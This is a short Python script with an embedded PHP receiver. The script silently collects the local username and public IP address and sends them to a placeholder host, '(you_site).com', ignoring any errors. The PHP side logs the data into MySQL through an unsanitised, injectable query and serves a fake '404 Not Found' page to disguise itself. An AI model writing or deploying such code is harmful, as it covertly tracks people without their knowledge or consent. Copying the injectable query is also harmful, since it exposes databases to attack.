import urllib.request as ur
import requests as r
import getpass

name  = getpass.getuser()

try:
    res = ur.urlopen('http://api.ipify.org/')
    resp = (res.read()).decode('utf-8')
    data = (str(name) +' From '+ str(resp))

    r.request('POST', 'http://(you_site).com/data.php?dt='+data) #create a php script

except OSError or IOError:
    pass


#my php
'''
<?php
$conn = mysql_connect('localhost', 'Server Username', 'Server Password');
mysql_select_db('Your DB Name');
date_default_timezone_set("Asia/Colombo");
$tim_in = date("Y:m:d - H:i:s");
$data = $_REQUEST['dt'];
$val = mysql_query("INSERT INTO server(data, time) VALUES ('$data', '$tim_in')",$conn);
?>

<html>
<br><br><br><br><br><br><br><br><br>
<p align='center'>404 Not Found</p>
</html>
'''
